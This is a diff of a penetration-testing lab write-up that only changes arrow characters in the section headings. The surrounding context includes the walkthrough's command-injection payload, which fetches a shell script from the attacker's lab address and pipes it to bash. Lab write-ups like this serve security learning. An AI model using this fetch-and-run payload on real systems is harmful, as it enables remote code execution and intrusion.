@@ -32,7 +32,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 We can add this host to our `/etc/hosts` file and start proxying traffic through Burpsuite.&#x20;
 
-### Web Enum --> Spring Boot --> Admin
+### Web Enum -> Spring Boot -> Admin
 
 Port 80 shows a basic corporate site:
 
@@ -119,7 +119,7 @@ Using this cookie, we can access the administrator dashboard:
 
 <figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
 
-### Admin Dashboard --> RCE
+### Admin Dashboard -> RCE
 
 At the bottom of the dashboard, we can see a few fields that take user input and hint that this is the `/executessh` service:
 
@@ -182,7 +182,7 @@ curl${IFS}10.10.14.22/shell.sh|bash
 
 ## Privilege Escalation
 
-### CloudHosting Jar --> SQL + User Creds
+### CloudHosting Jar -> SQL + User Creds
 
 The `app` user has access to this `.jar` file:
 
@@ -325,7 +325,7 @@ Using this password, we can `ssh` in as `josh`:
 
 <figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
 
-### Sudo Privileges --> Root
+### Sudo Privileges -> Root
 
 Since we have the user's password, we can check our `sudo` privileges:
 
